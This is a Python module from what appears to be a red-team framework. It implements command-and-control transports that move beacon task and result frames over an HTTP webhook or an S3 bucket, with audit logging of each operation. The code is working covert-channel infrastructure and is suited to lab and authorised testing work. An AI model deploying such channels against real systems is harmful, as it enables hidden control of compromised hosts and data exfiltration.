"""THE VOID — C2 cloud transports (webhook push, S3 poll).

Transports move profile-shaped C2 frames between beacon and daemon over
cloud infrastructure. Both are **dependency-injected**: WebhookTransport
takes a requests-like ``session`` (``.post``/``.get``) and S3PollTransport
takes a boto3-like ``client`` (``.put_object``/``.get_object``/
``.list_objects_v2``) so tests and offline labs never open a real socket.

Every transport operation is WarLog-evidenced (LogLevel.C2): direction,
transport name, profile, size and outcome — never payload bytes or keys.

Frames are opaque profile-wrapped blobs: the transport does not interpret
content, only moves it and reports status.
"""

from __future__ import annotations

import logging
import time
from typing import Any, Dict, Optional

from core.warlog import LogLevel, WarLog
from c2.profiles import Profile, builtin

logger = logging.getLogger("void.c2.transports")


class TransportError(Exception):
    """Raised when a transport operation fails or is misconfigured."""


class Transport:
    """Base transport: profile shaping + WarLog evidence for every op."""

    name = "base"

    def __init__(self, profile: Optional[Profile] = None,
                 warlog: Optional[WarLog] = None):
        self.profile = profile if profile is not None else builtin("http-beacon")
        self.warlog = warlog if warlog is not None else WarLog()

    def _evidence(self, message: str, data: Dict[str, Any],
                  status: str = "ok") -> None:
        level = LogLevel.C2 if status == "ok" else LogLevel.ERROR
        try:
            self.warlog.log(
                message,
                level=level,
                module=f"c2.transport.{self.name}",
                target=data.get("target", self.name),
                data={**data, "status": status},
            )
        except Exception:
            logger.exception("WarLog write failed for transport op %s", message)

    def send(self, frame: bytes, **kwargs: Any) -> Dict[str, Any]:
        raise NotImplementedError

    def receive(self, **kwargs: Any) -> bytes:
        raise NotImplementedError


class WebhookTransport(Transport):
    """Push/pull C2 frames through an HTTP(S) webhook endpoint.

    Args:
        url: Endpoint the beacon pushes frames to (and polls for tasks).
        session: requests-like object (``.post(url, data=..., headers=...)``,
            ``.get(url, headers=...)``). Real ``requests`` is imported lazily
            only when no session is injected.
    """

    name = "webhook"

    def __init__(self, url: str, session: Any = None,
                 profile: Optional[Profile] = None,
                 warlog: Optional[WarLog] = None):
        super().__init__(profile=profile, warlog=warlog)
        if not url:
            raise TransportError("webhook transport requires a url")
        self.url = url
        self._session = session

    @property
    def session(self) -> Any:
        if self._session is None:
            import requests

            self._session = requests.Session()
        return self._session

    def send(self, frame: bytes, **kwargs: Any) -> Dict[str, Any]:
        request = self.profile.render_request(self.profile.wrap(frame))
        started = time.monotonic()
        try:
            resp = self.session.post(
                self.url, data=request["body"], headers=request["headers"], timeout=30
            )
            status = getattr(resp, "status_code", 200)
            if status not in self.profile.allowed_status:
                raise TransportError(f"webhook rejected frame (status {status})")
            elapsed = int((time.monotonic() - started) * 1000)
            self._evidence(
                "c2.transport.send",
                {"target": self.url, "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame),
                 "latency_ms": elapsed, "http_status": status},
            )
            return {"ok": True, "status": status, "bytes": len(frame),
                    "latency_ms": elapsed}
        except TransportError:
            self._evidence(
                "c2.transport.send_failed",
                {"target": self.url, "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame)},
                status="error",
            )
            raise
        except Exception as exc:
            self._evidence(
                "c2.transport.send_failed",
                {"target": self.url, "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame),
                 "error": str(exc)[:200]},
                status="error",
            )
            raise TransportError(f"webhook send failed: {exc}") from exc

    def receive(self, **kwargs: Any) -> bytes:
        started = time.monotonic()
        try:
            resp = self.session.get(self.url, headers=dict(self.profile.headers), timeout=30)
            status = getattr(resp, "status_code", 200)
            if status not in self.profile.allowed_status:
                raise TransportError(f"webhook poll failed (status {status})")
            body = getattr(resp, "content", b"") or b""
            payload = self.profile.parse_response(status, body)
            elapsed = int((time.monotonic() - started) * 1000)
            self._evidence(
                "c2.transport.receive",
                {"target": self.url, "transport": self.name,
                 "profile": self.profile.name, "bytes": len(payload),
                 "latency_ms": elapsed, "http_status": status},
            )
            return payload
        except Exception as exc:
            self._evidence(
                "c2.transport.receive_failed",
                {"target": self.url, "transport": self.name,
                 "error": str(exc)[:200]},
                status="error",
            )
            if isinstance(exc, TransportError):
                raise
            raise TransportError(f"webhook receive failed: {exc}") from exc


class S3PollTransport(Transport):
    """Poll an S3 bucket/prefix for task frames and push result frames.

    Args:
        bucket: Bucket name.
        prefix: Key prefix for C2 frames (tasks under ``{prefix}/tasks/``,
            results under ``{prefix}/results/``).
        client: boto3 S3-like object (``get_object``/``put_object``/
            ``list_objects_v2``). Imported lazily (``boto3.client("s3")``)
            only when no client is injected.
    """

    name = "s3poll"

    def __init__(self, bucket: str, prefix: str = "void-c2",
                 client: Any = None, profile: Optional[Profile] = None,
                 warlog: Optional[WarLog] = None):
        super().__init__(profile=profile, warlog=warlog)
        if not bucket:
            raise TransportError("s3 transport requires a bucket")
        self.bucket = bucket
        self.prefix = prefix.strip("/")
        self._client = client

    @property
    def client(self) -> Any:
        if self._client is None:
            import boto3

            self._client = boto3.client("s3")
        return self._client

    def send(self, frame: bytes, **kwargs: Any) -> Dict[str, Any]:
        """Push a result frame to ``{prefix}/results/{key}``."""
        key = kwargs.get("key") or f"{int(time.time())}.frame"
        full_key = f"{self.prefix}/results/{key}"
        request = self.profile.render_request(self.profile.wrap(frame))
        try:
            self.client.put_object(
                Bucket=self.bucket, Key=full_key, Body=request["body"],
                ContentType=request["headers"].get("Content-Type", "application/octet-stream"),
            )
            self._evidence(
                "c2.transport.send",
                {"target": f"s3://{self.bucket}/{full_key}", "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame)},
            )
            return {"ok": True, "key": full_key, "bytes": len(frame)}
        except Exception as exc:
            self._evidence(
                "c2.transport.send_failed",
                {"target": f"s3://{self.bucket}/{full_key}", "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame),
                 "error": str(exc)[:200]},
                status="error",
            )
            raise TransportError(f"s3 send failed: {exc}") from exc

    def send_task(self, frame: bytes, **kwargs: Any) -> Dict[str, Any]:
        """Push a task frame to ``{prefix}/tasks/{key}`` (daemon → beacon)."""
        key = kwargs.get("key") or f"{int(time.time())}.task"
        full_key = f"{self.prefix}/tasks/{key}"
        request = self.profile.render_request(self.profile.wrap(frame))
        try:
            self.client.put_object(
                Bucket=self.bucket, Key=full_key, Body=request["body"],
                ContentType=request["headers"].get("Content-Type", "application/octet-stream"),
            )
            self._evidence(
                "c2.transport.send_task",
                {"target": f"s3://{self.bucket}/{full_key}", "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame)},
            )
            return {"ok": True, "key": full_key, "bytes": len(frame)}
        except Exception as exc:
            self._evidence(
                "c2.transport.send_task_failed",
                {"target": f"s3://{self.bucket}/{full_key}", "transport": self.name,
                 "profile": self.profile.name, "bytes": len(frame),
                 "error": str(exc)[:200]},
                status="error",
            )
            raise TransportError(f"s3 send_task failed: {exc}") from exc

    def _receive_prefix(self, sub: str, label: str) -> bytes:
        """Fetch the oldest frame under ``{prefix}/{sub}/`` and unwrap it."""
        try:
            resp = self.client.list_objects_v2(
                Bucket=self.bucket, Prefix=f"{self.prefix}/{sub}/"
            )
            contents = resp.get("Contents", []) if isinstance(resp, dict) else []
            keys = sorted(obj["Key"] for obj in contents if "Key" in obj)
            if not keys:
                self._evidence(
                    "c2.transport.receive_empty",
                    {"target": f"s3://{self.bucket}/{self.prefix}/{sub}/",
                     "transport": self.name, "profile": self.profile.name},
                )
                return b""
            key = keys[0]
            obj = self.client.get_object(Bucket=self.bucket, Key=key)
            body = obj.get("Body", b"")
            if hasattr(body, "read"):
                body = body.read()
            payload = self.profile.parse_response(200, body or b"")
            self._evidence(
                "c2.transport.receive",
                {"target": f"s3://{self.bucket}/{key}", "transport": self.name,
                 "profile": self.profile.name, "bytes": len(payload)},
            )
            return payload
        except Exception as exc:
            self._evidence(
                "c2.transport.receive_failed",
                {"target": f"s3://{self.bucket}/{self.prefix}/{sub}/",
                 "transport": self.name, "error": str(exc)[:200]},
                status="error",
            )
            if isinstance(exc, TransportError):
                raise
            raise TransportError(f"s3 {label} failed: {exc}") from exc

    def receive_result(self, **kwargs: Any) -> bytes:
        """Fetch the oldest result frame from ``{prefix}/results/`` (daemon side)."""
        return self._receive_prefix("results", "receive_result")

    def receive(self, **kwargs: Any) -> bytes:
        """Fetch the oldest task frame from ``{prefix}/tasks/``."""
        return self._receive_prefix("tasks", "receive")
